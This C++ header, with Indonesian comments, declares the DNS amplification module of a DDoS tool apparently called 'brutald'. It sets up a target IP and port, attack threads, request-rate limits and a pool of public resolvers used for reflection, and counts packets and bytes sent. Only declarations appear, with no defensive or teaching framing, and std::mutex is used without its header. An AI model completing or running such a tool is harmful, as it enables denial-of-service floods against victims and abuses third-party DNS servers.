#ifndef BRUTAL_DDOS_DNS_AMPLIFICATION_H
#define BRUTAL_DDOS_DNS_AMPLIFICATION_H

#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <memory>
#include <functional>

// Asumsi tipe data dari core/network berdasarkan struktur file
namespace brutald {
    namespace network {
        class SocketManager;
        class PacketGenerator;
    }
    namespace utils {
        class Logger;
    }
}

struct DnsConfig {
    std::string target_ip;
    int target_port; // Port tujuan akhir (biasanya 53, tapi bisa service lain)
    int threads;
    uint64_t rps_limit; // Requests per second limit per thread
    bool use_random_resolvers; // Jika true, gunakan pool resolver publik
    bool verbose;
};

class DnsAmplification {
public:
    DnsAmplification(const DnsConfig& config, 
                     std::shared_ptr<brutald::network::SocketManager> socket_mgr,
                     std::shared_ptr<brutald::network::PacketGenerator> packet_gen,
                     std::shared_ptr<brutald::utils::Logger> logger);

    ~DnsAmplification();

    void start();
    void stop();
    
    // Statistik
    struct Stats {
        uint64_t packets_sent = 0;
        uint64_t bytes_sent = 0;
        uint64_t errors = 0;
    };
    
    Stats getStats() const;

private:
    void worker_thread(int thread_id);
    void send_query(uint64_t sequence_number);
    
    // Resolver publik umum untuk amplifikasi
    static const std::vector<std::string> default_resolvers;

    DnsConfig config_;
    std::shared_ptr<brutald::network::SocketManager> socket_mgr_;
    std::shared_ptr<brutald::network::PacketGenerator> packet_gen_;
    std::shared_ptr<brutald::utils::Logger> logger_;

    std::atomic<bool> running_{false};
    std::vector<std::thread> threads_;
    mutable Stats stats_;
    
    // Mutex untuk update stats agar race-condition free
    mutable std::mutex stats_mutex_;
};

#endif // BRUTAL_DDOS_DNS_AMPLIFICATION_H
